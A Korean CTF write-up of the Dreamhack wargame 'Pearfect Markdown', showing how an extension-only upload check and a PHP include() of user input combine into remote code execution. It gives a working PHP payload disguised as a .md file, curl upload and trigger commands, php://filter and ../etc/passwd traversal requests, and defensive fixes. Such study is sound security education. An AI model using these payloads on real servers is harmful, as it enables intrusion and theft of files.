---
layout: post
title:  "Dreamhack 워게임 Pearfect Markdown 풀이 — .md 업로드 + PHP include() 한 줄로 RCE"
date:   2026-05-16 10:00:00 +0900
categories: security web wargame dreamhack writeup php lfi rce
---

## 들어가며

Dreamhack 웹해킹 워게임 **Pearfect Markdown** (난이도 Unrated) 풀이입니다. "실시간 마크다운 편집기" 라는 평범한 SaaS 같은 외피 안에, 사이버보안 입문 학생이 꼭 한 번 만나야 할 **"확장자 검증만 하고 내용은 검사 안 하는 업로드" + "사용자 입력을 그대로 `include()` 하는 PHP"** 라는 두 클래식 패턴이 그대로 결합되어 있습니다.

스포일러로 결론:

```bash
# 1) .md 파일에 PHP 코드를 넣어 업로드
cat > shell.md <<'EOF'
<?php
foreach (glob('/*_flag') as $f) echo file_get_contents($f);
?>
EOF
curl -X POST "$SERVER/upload.php" -F "file=@shell.md"

# 2) post_handler.php 가 우리 .md 를 그대로 include() → PHP 실행
curl "$SERVER/post_handler.php?file=shell.md"
# → DH{9a2a75682b662e873797cd3ccdd6b22fb166d43f2dddc6e57de9a6c0effc9307}
```

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

ZIP 의 PHP 5개를 차례로 보자.

### 1-1. `upload.php` — 업로드: 확장자만 검사

```php
if (pathinfo($name, PATHINFO_EXTENSION) === 'md') {
    move_uploaded_file($tmp_name, "$uploads_dir/$name");
    echo "File uploaded successfully!";
} else {
    echo "Only .md files are allowed!";
}
```

- 검증: **파일 이름의 확장자만** `md` 인지 확인.
- **파일 내용은 전혀 검사 안 함** — `shell.md` 라는 이름이면 그 안에 `<?php ...?>` 가 들어 있어도 통과.

### 1-2. `post_handler.php` — `include()` 사용자 입력

```php
$uploads_dir = 'uploads/';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $file = $_GET['file'] ?? 'example.md';
    $path = $uploads_dir . $file;
    include($path);              // ★ 임의 파일을 PHP 로 평가
}
```

- `$_GET['file']` 을 **그대로 경로 조합** 후 `include()`.
- `include()` 는 확장자에 무관하게 **파일 내용을 PHP 로 해석** 한다. `.md` 든 `.txt` 든 `<?php ... ?>` 가 들어있으면 그대로 실행.
- 추가 점검: path traversal 도 가능. `?file=../../../etc/passwd` 같은 LFI 도 됨. 다만 우리 목표(RCE → flag) 에는 업로드 파일 include 가 더 깨끗.

### 1-3. `edit.php` & `save.php` — 우리 PoC 와 무관

`edit.php` 는 파일 내용을 보여주고 `save.php` 는 저장. 둘 다 `realpath` 로 uploads 안 경로인지 확인. 우리에겐 필요 없음.

### 1-4. `Dockerfile` — flag 의 위치

```dockerfile
RUN RANDOM_STR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32) && \
    mv /var/www/html/flag /${RANDOM_STR}_flag
```

flag 파일은 컨테이너 빌드시 **`/` 디렉터리 아래 `<32자랜덤>_flag`** 이름으로 옮겨진다. 정확한 이름을 모르므로 `glob('/*_flag')` 로 찾아낸다.

### 1-5. 공격 그림

```
1. .md 파일에 <?php payload ?> 작성
2. /upload.php 로 업로드 (.md 확장자 검사 통과)
3. /post_handler.php?file=our.md 호출
4. include('uploads/our.md') → PHP 실행 → flag 읽기
```

## 2. 익스플로잇

### 2-1. PHP 페이로드 파일 작성

```bash
cat > /tmp/shell.md <<'EOF'
<?php
$files = glob('/*_flag');
foreach ($files as $f) {
    echo "FILE: $f\n";
    echo file_get_contents($f);
}
?>
EOF
```

`glob('/*_flag')` 가 `/<random>_flag` 를 찾아내고, `file_get_contents` 가 그 내용을 읽어 echo.

### 2-2. 업로드 + 트리거

```bash
SERVER=http://<host>:<port>

# 업로드
curl -X POST "$SERVER/upload.php" -F "file=@/tmp/shell.md"
# → File uploaded successfully!

# include() 로 실행
curl "$SERVER/post_handler.php?file=shell.md"
```

응답:

```
FILE: /qeNSko1Mxxz8oeCOdlmHEK46vDOwOMKn_flag
DH{9a2a75682b662e873797cd3ccdd6b22fb166d43f2dddc6e57de9a6c0effc9307}
```

flag 획득. ✓

### 2-3. 한 줄 짜리 alternative

`include()` 가 사용자 입력 받기 때문에, **PHP wrapper** 를 직접 쏴도 된다. 예:

```bash
curl "$SERVER/post_handler.php?file=php://filter/read=convert.base64-encode/resource=../index.php"
```

→ `index.php` 의 base64 인코딩된 소스를 받음. 일반적인 LFI 소스 노출.

또는 path traversal 로 그냥 임의 파일 읽기:

```bash
curl "$SERVER/post_handler.php?file=../../../../etc/passwd"
```

→ /etc/passwd 내용을 PHP 로 해석. PHP 태그가 없으면 텍스트가 그대로 echo. PHP 태그가 있으면 실행.

이 문제에서 flag 는 `<random>_flag` 라는 **랜덤 이름** 이라 직접 LFI 보다 **업로드 + RCE → glob** 으로 찾는 게 깔끔하다.

## 3. 취약점 해설 — Two-Layer Bug

이 문제의 본질은 두 가지 클래식 패턴의 결합:

> 1. **확장자만 검사하는 업로드** — 파일 내용에 PHP 코드를 박을 수 있다.
> 2. **사용자 입력을 그대로 `include()`** — PHP 가 어떤 파일이든 PHP 로 해석한다.

각각 단독으로도 위험하지만, 두 개가 같은 앱에 있으면 **즉시 RCE**.

### 3-1. 같은 패턴의 실무 사례

- **WordPress / Joomla 등 CMS 플러그인** 의 image upload 가 `.jpg.php` 같은 이중 확장자 또는 magic bytes 우회로 RCE.
- **이미지 업로드 후 EXIF 데이터에 PHP 코드 박기** → `.jpg` 로 위장 후 `include` 트리거.
- 마크다운 / 위키 편집기에서 파일 첨부 후 server-side 렌더링 단계에서 LFI/RFI.
- **avatar uploader → profile page 에서 include()** 같은 자주 보이는 조합.

### 3-2. 위험성

- 단순 LFI 도 위험하지만, 업로드 가능 + include() 가 만나면 **RCE**.
- RCE 면 어떤 보호도 의미 없음. flag 파일을 랜덤 이름으로 옮긴 것도 `glob` 한 줄로 무력화.
- 클러스터 환경이면 같은 컨테이너 내의 다른 사용자 데이터 / secret / SSRF 도 같이 노출.

### 3-3. 올바른 방어

1. **업로드 검증을 다층으로**:
   - 확장자(MIME) + 파일 내용(magic bytes) + 파일 처리 라이브러리 자체의 sanity 검사.
   - 업로드 디렉터리에는 **PHP 실행 불가** 설정 (Apache `php_admin_flag engine off` 또는 nginx `location` 으로 `.php` 매핑 제거).
   - 업로드된 파일을 **웹 루트 밖** 에 저장하고, 응답할 때만 서버가 읽어서 전달.

2. **사용자 입력은 `include()` 에 절대 넣지 말 것**.
   - 동적 include 가 필요하다면 **strict whitelist**:

     ```php
     $pages = ['home' => 'home.php', 'about' => 'about.php'];
     $page = $pages[$_GET['page']] ?? null;
     if ($page) include __DIR__ . '/' . $page;
     ```

3. **마크다운 렌더링은 서버 사이드 라이브러리** 로 (e.g., commonmark, league/commonmark). HTML escape 와 sanitize 가 함께 들어있는 라이브러리.

4. **PHP 의 `allow_url_include = Off`** (디폴트), `open_basedir` 로 파일 시스템 접근 제한.

5. **민감 파일 경로 randomize 는 보조 수단**. 이번 문제처럼 RCE 가 있으면 무의미. 진짜 방어는 RCE 자체를 차단.

## 4. 정리 — 입문자가 가져갈 교훈

- **업로드 검증 = 확장자만 보면 거의 항상 우회 가능**. 확장자 + MIME + magic bytes + 라이브러리 검증 다층으로.
- **`include($_GET[...])` / `include($_POST[...])`** 는 PHP 코드 베이스에서 가장 자주 RCE 로 이어지는 한 줄. 거의 모든 PHP 보안 가이드의 No.1 금지 패턴.
- "확장자가 .md 인데 PHP 가 실행될까?" → **PHP 의 `include` 는 확장자에 무관하다**. include() 한 모든 파일이 PHP 컨텍스트로 해석된다.
- 검색 대상 파일이 랜덤 이름이라도 `glob()`, `scandir()`, `ls` 한 줄이면 다 찾는다.
- 두 개의 single bug (`upload extension only`, `include user input`) 가 만나면 **two-layer RCE**. 항상 두 가지를 동시에 본다.

같은 카테고리의 다음 단계로 **PHP LFI Advanced**, **PHP filter chain → RCE (Charles Fol's gadget)**, **WordPress media upload + plugin LFI** 같은 케이스를 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. flag 파일 이름을 추측할 뻔

Dockerfile 의 `RANDOM_STR` 부분을 처음 봤을 때 "랜덤 이름이라 어떻게 찾지?" 잠시 멈춤. 곧 `glob('/*_flag')` 한 줄로 끝낼 수 있다는 점을 인지. RCE 가 있으면 파일 이름 랜덤화는 거의 무력하다는 사실의 좋은 예시.

**회고**: 파일 이름이 unknown 일 때는 두 가지 도구만 알면 된다.
- `glob(pattern)` — 패턴 매칭으로 찾기
- `scandir(dir)` / `opendir+readdir` — 디렉터리 전체 나열

PoC 짤 때 패턴 매칭 우선, 나열은 패턴이 안 통할 때.

### 실패 2. `post_handler.php` 가 `include` 하는 걸 처음에 못 봄

소스 정독 시 `include($path)` 한 줄을 처음에 무심코 넘어갔다. `index.php` 의 `fetch('post_handler.php')` 가 markdown 텍스트를 받아 marked.js 로 렌더링하는 흐름이라, 처음엔 "그냥 텍스트 echo 하는 거겠지" 라고 가정. 코드를 다시 보니 명백한 LFI/RFI.

**회고**: PHP 의 `include`/`require`/`include_once`/`require_once` 4개 함수는 **소스 정독시 무조건 노란펜으로 마킹**. 이 함수들이 user input 과 만나면 즉시 RCE 후보.

### 실패 3. 마크다운 XSS 를 먼저 의심함

"실시간 마크다운 편집기" → marked.js 클라이언트 사이드 렌더링 → 첫 본능은 마크다운 XSS (`[click](javascript:...)`, `<img onerror=...>` 등). 코드 보니 marked 가 클라이언트에서만 돌고 서버에는 마크다운 렌더링 자체가 없어서 XSS 시나리오는 부적합. 더 중요한 게 PHP include.

**회고**: 문제 이름에 "Markdown" 이 들어가도 XSS 가 정답이 아닐 수 있다. 표면을 한 번 만 보고 결론짓지 말고 전체 소스를 훑자. PHP 라면 항상 `include`/`require` 가 1순위 후보.

### 실패 4. realpath 가드를 처음에 막혀 있다고 가정

`edit.php` 와 `save.php` 에는 `realpath` + `strpos($path, realpath($uploads_dir)) === 0` 가드가 있다. 처음에 "여기서 막혔구나" 생각하다가 — `post_handler.php` 에는 그런 가드가 **전혀 없음**. 같은 앱 안에서도 endpoint 마다 검증 수준이 다르다.

**회고**: SSRF/LFI 가드를 평가할 때는 **모든 endpoint 를 동등하게 보지 말 것**. 한 곳이 잘 막혀 있어도 다른 곳에 빈틈이 있을 수 있다. 코드 리뷰는 **모든** 라우트의 entry point 를 확인.
